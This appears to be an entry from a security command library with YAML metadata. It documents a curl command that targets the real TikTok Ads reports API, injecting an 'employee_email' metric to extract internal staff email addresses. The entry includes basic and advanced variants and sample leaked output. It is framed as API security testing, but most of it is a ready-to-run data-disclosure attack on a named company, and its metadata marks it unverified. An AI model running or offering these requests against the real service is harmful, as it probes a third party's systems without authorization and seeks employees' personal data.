---
data: >-
  curl -X POST 'https://ads.tiktok.com/api/v1/reports' -H 'Authorization: Bearer
  YOUR_ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{"metrics":
  ["impressions", "clicks", "employee_email"], "dimensions": ["campaign_id"]}'
tags:
  - api-testing
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.564Z'
id: 504aaa29-4b95-479c-97d6-cc81d2888d36
verified: false
validated: true
submitted: true
---
# curl-tiktok-ads-employee-disclosure

## Command

```bash
curl -X POST 'https://ads.tiktok.com/api/v1/reports' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"metrics": ["impressions", "clicks", "employee_email"], "dimensions": ["campaign_id"]}'
```

## Description

This curl command exploits the TikTok Ads API by sending a POST request to the reports endpoint with an unauthorized 'employee_email' parameter in the metrics array, potentially disclosing internal employee emails. Use it during API security testing to check for information disclosure vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://ads.tiktok.com/api/v1/reports` | Target API endpoint for reports | Yes |
| `-H 'Authorization: Bearer YOUR_ACCESS_TOKEN'` | Authentication header with API token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{...}'` | JSON payload with metrics array including unauthorized parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/v1/reports' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"metrics": ["employee_email"]}'
```

### Advanced Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/v1/reports' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"metrics": ["impressions", "employee_email"], "dimensions": ["ad_id", "campaign_id"], "date_range": {"start_date": "2023-01-01", "end_date": "2023-12-31"}}' -v
```

## Expected Output

Successful execution returns a JSON response with disclosed data, e.g., {"data": {"employee_email": ["emp1@tiktok.com", "emp2@tiktok.com"]}}. Errors may include 401 Unauthorized or 400 Bad Request if validation is present.

## Related

- [[Related Procedure: Exploit-Unauthorized-Metrics-Parameter-for-Employee-Email-Disclosure]]
